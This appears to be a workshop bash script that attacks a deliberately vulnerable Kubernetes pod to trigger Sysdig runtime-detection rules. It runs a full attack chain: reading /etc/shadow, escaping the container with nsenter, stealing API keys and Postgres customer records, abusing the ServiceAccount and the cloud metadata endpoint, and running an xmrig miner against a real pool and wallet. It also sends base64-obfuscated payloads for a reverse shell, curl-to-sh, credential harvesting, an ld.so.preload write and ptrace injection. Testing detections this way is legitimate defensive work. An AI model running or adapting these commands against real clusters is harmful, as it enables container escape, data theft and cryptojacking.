#!/usr/bin/env bash
# Script to demonstrate how to interact with security-playground

# Robust NodePort target: honor a pre-set NODE_IP, else the first READY node's internal IP; never silently empty (see workshop node-IP note).
NODE_IP="${NODE_IP:-$(kubectl get nodes -o jsonpath='{range .items[*]}{.status.conditions[?(@.type=="Ready")].status} {.status.addresses[?(@.type=="InternalIP")].address}{"\n"}{end}' 2>/dev/null | awk '$1=="True"{print $2; exit}')}"
[ -z "$NODE_IP" ] && { echo "ERROR: could not resolve a Ready node IP via kubectl — run 'sudo bash' so KUBECONFIG is set (or export NODE_IP=<node internal IP>)." >&2; exit 1; }
NODE_PORT=30000
HELLO_NAMESPACE=hello

# Try to reach hello-server for our NetworkPolicy example later
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=curl --connect-timeout 5 http://hello-server.$HELLO_NAMESPACE.svc:8080" > /dev/null 

echo "1. Reading a sensitive file (/etc/shadow)"
echo "--------------------------------------------------------------------------------"
echo "Running curl $NODE_IP:$NODE_PORT/etc/shadow"
echo "---"
curl --connect-timeout 5 $NODE_IP:$NODE_PORT/etc/shadow
echo "--------------------------------------------------------------------------------"
sleep 15


echo "2. Writing a new file to a sensitive path (/bin), setting it to be executable and then running it"
echo "--------------------------------------------------------------------------------"
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/bin/hello -d \'content=echo \"hello-world\"\'"
echo "---"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/bin/hello -d 'content=echo "hello-world"'
echo ""
echo "---"
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=chmod 0755 /bin/hello'"
echo "---"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=chmod 0755 /bin/hello'
echo "---"
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=hello'"
echo "---"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=hello'
echo "--------------------------------------------------------------------------------"
sleep 15

echo "3. Installing nmap from apt and then run a network scan"
echo "--------------------------------------------------------------------------------"
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=apt-get update; apt-get -y install nmap;nmap -v scanme.nmap.org'"
echo "---"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=apt-get update; apt-get -y install nmap;nmap -v scanme.nmap.org'
echo "--------------------------------------------------------------------------------"
sleep 15

echo "4. Breaking out of our container with nsenter to install crictl in /usr/bin"
echo "--------------------------------------------------------------------------------"
ARCH=$(curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=dpkg --print-architecture')
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d \"command=nsenter --all --target=1 wget -q https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.29.0/crictl-v1.29.0-linux-$ARCH.tar.gz\""
echo "---"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 wget --timeout=15 --tries=1 -q https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.29.0/crictl-v1.29.0-linux-$ARCH.tar.gz"
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d \"command=nsenter --all --target=1 tar -zxvf crictl-v1.29.0-linux-$ARCH.tar.gz -C /usr/bin\""
echo "---"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 tar -zxvf crictl-v1.29.0-linux-$ARCH.tar.gz -C /usr/bin"
echo "--------------------------------------------------------------------------------"
sleep 15

echo "5. Breaking out of our Linux namespace to the host's with nsenter and running crictl against the Node's container runtime"
echo "--------------------------------------------------------------------------------"
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=nsenter --all --target=1 crictl ps'"
echo "---"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=nsenter --all --target=1 crictl ps'
echo "--------------------------------------------------------------------------------"
sleep 15

echo "6. Stealing a secret from another container on the same Node (hello-client in the $HELLO_NAMESPACE Namespace) with crictl"
echo "--------------------------------------------------------------------------------"
HELLO_ID=$(curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=nsenter --all --target=1 crictl ps --name hello-client -q')
HELLO_ID_1=`echo "${HELLO_ID}" | head -1`
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d \"command=nsenter --all --target=1 crictl exec $HELLO_ID_1 /bin/sh -c set\" | grep API_KEY"
echo "---"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 crictl exec $HELLO_ID_1 /bin/sh -c set"  | grep API_KEY
echo "--------------------------------------------------------------------------------"
sleep 15

echo "7. Exfiltrating some data from another container running on the same Node (a Postgres database in the postgres-sakila Namespace) with crictl"
echo "--------------------------------------------------------------------------------"
POSTGRES_ID=$(curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=nsenter --all --target=1 crictl ps --name postgres-sakila -q')
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d \"command=nsenter --all --target=1 crictl exec $POSTGRES_ID psql -U postgres -c \'SELECT c.first_name, c.last_name, c.email, a.address, a.postal_code FROM customer c JOIN address a ON (c.address_id = a.address_id) LIMIT 10\'\""
echo "---"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 crictl exec $POSTGRES_ID psql -U postgres -c 'SELECT c.first_name, c.last_name, c.email, a.address, a.postal_code FROM customer c JOIN address a ON (c.address_id = a.address_id) LIMIT 10'"
echo "--------------------------------------------------------------------------------"
sleep 15

echo "8. Downloading/Installing kubectl then calling the Kubernetes API via security-playground's access (via its ServiceAccount)"
echo "--------------------------------------------------------------------------------"
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d \"command=curl -O https://s3.us-west-2.amazonaws.com/amazon-eks/1.28.3/2023-11-14/bin/linux/$ARCH/kubectl\""
echo "---"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=curl --connect-timeout 5 -O https://s3.us-west-2.amazonaws.com/amazon-eks/1.28.3/2023-11-14/bin/linux/$ARCH/kubectl"
echo "---"
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=chmod 0755 ./kubectl'"
echo "---"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=chmod 0755 ./kubectl'
echo "---"
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=chmod 0755 ./kubectl'"
echo "---"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=./kubectl create deployment nefarious-workload --image=public.ecr.aws/m9h2b5e7/security-playground:240324'
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=./kubectl get pods'
echo "--------------------------------------------------------------------------------"
sleep 15

echo "9. Calling the Node's AWS Instance Metadata Endpoint from within the security-playground container"
echo "--------------------------------------------------------------------------------"
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=curl http://169.254.169.254/latest/meta-data/iam/info'"
echo "---"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=curl --connect-timeout 5 http://169.254.169.254/latest/meta-data/iam/info'
echo "--------------------------------------------------------------------------------"
sleep 15

echo "10. Downloading and running a common crypto miner (xmrig)"
echo "--------------------------------------------------------------------------------"
if [[ "$ARCH" == "amd64" ]]; then
    echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d \"command=wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz -O xmrig.tar.gz\""
    echo "---"
    curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=wget --timeout=15 --tries=1 https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz -O xmrig.tar.gz"
else
    echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d \"command=wget https://z9k65lokhn70.s3.amazonaws.com/xmrig-6.20.0-linux-static-arm64.tar.gz -O xmrig.tar.gz\""
    echo "---"
    curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=wget --timeout=15 --tries=1 https://z9k65lokhn70.s3.amazonaws.com/xmrig-6.20.0-linux-static-arm64.tar.gz -O xmrig.tar.gz"
fi
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=tar -xzvf xmrig.tar.gz'"
echo "---"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=tar -xzvf xmrig.tar.gz'
echo "---"
echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=xmrig-6.20.0/xmrig'"
echo "---"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=xmrig-6.20.0/xmrig --coin=monero --url=stratum\+tcp://xmr-us-west1.nanopool.org:10343 --user=43NyzPLNUxSXbAgK9szPpvBxXhajTwAT1YEWHU6YAKcpfBuiw4DgH5LNbmPAk5m5A5AAhkbFWGu2PTdC1EoDnwpZEHnVCco -B --tls'


echo "================================================================================"
echo " ADDITIONAL RUNTIME-DETECTION TESTS (steps 11-17) — each maps to a Sysdig rule"
echo "================================================================================"

echo "11. Reading the Kubernetes ServiceAccount token from inside the pod (credential theft, T1528)"
echo "--------------------------------------------------------------------------------"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec --data-urlencode 'command=echo Y2F0IC92YXIvcnVuL3NlY3JldHMva3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC90b2tlbiA+L2Rldi9udWxs | base64 -d | timeout 12 sh'
echo ""
echo "--------------------------------------------------------------------------------"
sleep 15

echo "12. Spawning a Python reverse shell (a /bin/sh wired to a network socket, T1059)"
echo "--------------------------------------------------------------------------------"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec --data-urlencode 'command=echo ZXhwb3J0IE5TPWBncmVwIG5hbWVzZXJ2ZXIgL2V0Yy9yZXNvbHYuY29uZnxhd2sgJ3twcmludCAkMn0nYApweXRob24zIC1jICJpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgnJE5TJyw1MykpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3N1YnByb2Nlc3MuY2FsbChbJy9iaW4vc2gnLCctaSddKSI= | base64 -d | timeout 12 sh'
echo ""
echo "--------------------------------------------------------------------------------"
sleep 15

echo "13. Downloading a remote script and piping it straight to a shell (curl | sh, T1105)"
echo "--------------------------------------------------------------------------------"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec --data-urlencode 'command=echo Y3VybCAtcyAtbTMgaHR0cHM6Ly9leGFtcGxlLmNvbS8gMj4vZGV2L251bGwgfCBzaCAyPi9kZXYvbnVsbAplY2hvICIoc2ltdWxhdGVkIGN1cmwgfCBzaCDigJQgZmV0Y2hlZCBiZW5pZ24gc3RhdGljIGNvbnRlbnQpIg== | base64 -d | timeout 12 sh'
echo ""
echo "--------------------------------------------------------------------------------"
sleep 15

echo "14. Executing a base64-encoded shell script from the command line (defense evasion, T1027)"
echo "--------------------------------------------------------------------------------"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec --data-urlencode 'command=echo c2ggLWMgImVjaG8gJ0l5RXZZbWx1TDNOb0NtVmphRzhnSWtobGJHeHZJU0lLJ3xiYXNlNjQgLWQiID4vZGV2L251bGw= | base64 -d | timeout 12 sh'
echo ""
echo "--------------------------------------------------------------------------------"
sleep 15

echo "15. Harvesting secrets from other processes' /proc/*/environ (credential access, T1552.001)"
echo "--------------------------------------------------------------------------------"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec --data-urlencode 'command=echo Zm9yIGYgaW4gL3Byb2MvMS9lbnZpcm9uIC9wcm9jLzEvY21kbGluZSAvcHJvYy9zZWxmL2Vudmlyb247IGRvCiAgY2F0ICIkZiIgPi9kZXYvbnVsbCAyPiYxCmRvbmUKZWNobyAiICAocmVhZCAvcHJvYy8qL2Vudmlyb24gYW5kIC9wcm9jLyovY21kbGluZSAtLSBjcmVkZW50aWFsLWhhcnZlc3Rpbmcgc2lnbmFsKSI= | base64 -d | timeout 12 sh'
echo ""
echo "--------------------------------------------------------------------------------"
sleep 15

echo "16. Writing /etc/ld.so.preload (rootkit-style preload hijack, T1574.006)"
echo "--------------------------------------------------------------------------------"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec --data-urlencode 'command=echo ZWNobyAnJyA+IC9ldGMvbGQuc28ucHJlbG9hZApybSAtZiAvZXRjL2xkLnNvLnByZWxvYWQ= | base64 -d | timeout 12 sh'
echo ""
echo "--------------------------------------------------------------------------------"
sleep 15

echo "17. Injecting into PID 1 via ptrace(PTRACE_ATTACH) — works here thanks to privileged+hostPID (T1055)"
echo "--------------------------------------------------------------------------------"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec --data-urlencode 'command=echo cHl0aG9uMyAtYyAiCmltcG9ydCBjdHlwZXMsIG9zCmxpYmMgPSBjdHlwZXMuQ0RMTCgnbGliYy5zby42JywgdXNlX2Vycm5vPVRydWUpClBUUkFDRV9BVFRBQ0ggPSAxNgpyID0gbGliYy5wdHJhY2UoUFRSQUNFX0FUVEFDSCwgMSwgMCwgMCkKcHJpbnQoJ3B0cmFjZShQVFJBQ0VfQVRUQUNILCAxKSAtPicsIHIsICcoRVBFUk0gd2l0aG91dCBDQVBfU1lTX1BUUkFDRSknIGlmIHIgIT0gMCBlbHNlICcoYXR0YWNoZWQpJykKaWYgciA9PSAwOgogICAgbGliYy5wdHJhY2UoMTcsIDEsIDAsIDApICAjIFBUUkFDRV9ERVRBQ0gKIiAyPi9kZXYvbnVsbA== | base64 -d | timeout 12 sh'
echo ""
echo "--------------------------------------------------------------------------------"
sleep 15
